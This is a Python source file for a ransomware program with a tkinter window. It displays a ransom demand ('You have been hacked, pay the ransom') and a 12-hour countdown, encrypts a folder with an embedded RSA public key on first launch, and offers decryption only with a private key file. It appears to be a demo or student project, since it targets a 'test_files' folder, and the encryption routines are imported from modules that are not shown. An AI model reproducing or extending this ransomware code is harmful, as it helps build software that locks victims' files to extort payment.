import tkinter as tk
from tkinter import messagebox
import time
from encrypt import encrypt_directory
from decrypt import decrypt_directory
import os
import sys


class TimerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Files Encrypted")

        self.message_label = tk.Label(root, text="You have been hacked, pay the ransom and your files will be decrypted. Well.. hopefully.\n Make sure you do it before the timer runs out or you will lose your files :) .", font=("Arial", 12))
        self.message_label.pack(pady=10)

        self.timer_label = tk.Label(root, text="", font=("Arial", 24))  # Larger font for the timer
        self.timer_label.pack()

        self.start_time = time.time()
        self.update_timer()
        

        #calling the encrypt function
        if not os.path.exists(os.path.join(os.getcwd(), "marker.txt")):
            self.encrypt_files()

        self.decrypt_button = tk.Button(root, text="Decrypt Files", command=self.decrypt_files)
        self.decrypt_button.pack()

    def update_timer(self):
        current_time = time.time()
        elapsed_time = current_time - self.start_time
        remaining_time = 12 * 60 * 60 - elapsed_time  # 12 hours in seconds

        if remaining_time > 0:
            hours, remainder = divmod(remaining_time, 3600)
            minutes, seconds = divmod(remainder, 60)
            timer_str = "{:02}:{:02}:{:02}".format(int(hours), int(minutes), int(seconds))
            self.timer_label.config(text=timer_str)
            self.root.after(1000, self.update_timer)
        else:
            self.timer_label.config(text="Timer expired")


    #Function to encrypt the files.
    def encrypt_files(self):
        directory = os.path.join(os.getcwd(), "test_files")


    # # if the directory does not exist, we will exit the program
        if not os.path.exists(directory):
            print("Directory does not exist")
            sys.exit(1)


        key = """-----BEGIN PUBLIC KEY-----
        MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCsmkT5Ex06H/Wc5XOefVEe7ZGW
        Do/iCfjef3OQb7tkIzQSOD6A9ndJquJ+RZ/ewMcUkfgJp0uCBnvzyw289d/qg3Dv
        W9YbUfmGvB8l1lyrnP1kGZElZO6Hcq9ZRgior49lQBM71XQkPrixx8UPsuZdZoU1
        jPyV6KQK88WHCFWzyQIDAQAB
        -----END PUBLIC KEY-----"""

        marker = os.path.join(os.getcwd(),"marker.txt")
        with open(marker,'w'):
            pass

        encrypt_directory(directory, key)
        
        messagebox.showinfo("Encryption Complete", "Files encrypted successfully!")


    #Function to decrypt the files
    def decrypt_files(self):
        directory = os.path.join(os.getcwd(), "test_files")


    # # if the directory does not exist, we will exit the program
        if not os.path.exists(directory):
            print("Directory does not exist")
            sys.exit(1)

        private_key_path = 'privateKey.pem'

        if not os.path.exists(private_key_path):
            messagebox.showerror("Error", "Private key file not found!")
            return

        with open(private_key_path, 'rb') as priv:
            private_key = priv.read()

        decrypt_directory(directory, private_key)

        os.remove("marker.txt")

        messagebox.showinfo("Decryption Complete", "Files decrypted successfully!")



if __name__ == "__main__":
    root = tk.Tk()
    root.geometry("700x400")  # Set the window size to 400x300
    app = TimerApp(root)
    root.mainloop()
   
